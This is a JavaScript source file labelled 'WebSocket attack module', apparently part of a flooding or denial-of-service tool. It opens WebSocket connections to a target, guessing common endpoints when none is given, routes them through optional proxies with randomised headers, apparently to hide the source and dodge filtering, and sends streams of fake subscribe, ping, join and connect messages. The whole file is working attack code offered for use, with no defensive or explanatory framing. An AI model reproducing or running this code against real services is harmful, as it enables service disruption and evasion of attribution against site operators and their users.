/**
 * WebSocket attack module
 */
import WebSocket from "ws";
import { createProxyAgent, getRandomHeaders } from "../utils/http.js";

/**
 * Send WebSocket requests to target
 * @param {string} target - Target URL
 * @param {string} proxy - Proxy URL
 * @param {number} messages - Number of messages to send
 * @returns {Promise<Object>} WebSocket attack result
 */
export async function sendWebSocketRequest(target, proxy, messages = 10) {
  return new Promise(async (resolve) => {
    try {
      // Try to create a WebSocket URL from the target
      let wsUrl = target.replace('http://', 'ws://').replace('https://', 'wss://');

      // If no specific WebSocket endpoint is provided, try common ones
      if (!wsUrl.includes('/ws') && !wsUrl.includes('/socket')) {
        const wsEndpoints = ['/ws', '/socket', '/socket.io', '/ws/v1', '/live', '/chat'];
        wsUrl = `${wsUrl}${wsEndpoints[Math.floor(Math.random() * wsEndpoints.length)]}`;
      }

      const proxyAgent = proxy ? createProxyAgent(proxy) : null;

      const ws = new WebSocket(wsUrl, {
        agent: proxyAgent,
        headers: getRandomHeaders(target)
      });

      let success = false;
      let msgSent = 0;
      let connectionOpen = false;

      ws.on('open', () => {
        connectionOpen = true;

        // Send a series of messages
        const interval = setInterval(() => {
          if (msgSent >= messages || !connectionOpen) {
            clearInterval(interval);
            if (connectionOpen) {
              ws.close();
            }
            return;
          }

          const msgTypes = [
            JSON.stringify({ type: 'subscribe', channel: 'all' }),
            JSON.stringify({ action: 'ping', timestamp: Date.now() }),
            JSON.stringify({ cmd: 'connect', user: `user${Math.floor(Math.random() * 1000)}` }),
            JSON.stringify({ event: 'join', room: `room${Math.floor(Math.random() * 100)}` })
          ];

          ws.send(msgTypes[Math.floor(Math.random() * msgTypes.length)]);
          msgSent++;
          success = true;
        }, 100);
      });

      ws.on('message', (data) => {
        // Received a message, connection is working
        success = true;
      });

      ws.on('error', (error) => {
        // If the connection wasn't established, mark as failed
        if (!connectionOpen) {
          success = false;
        }
        ws.close();
      });

      // Close the connection after a timeout
      setTimeout(() => {
        if (connectionOpen) {
          ws.close();
        }
        resolve({ success, messagesSent: msgSent });
      }, 5000);
    } catch (error) {
      resolve({ success: false, messagesSent: 0, error: error.message });
    }
  });
}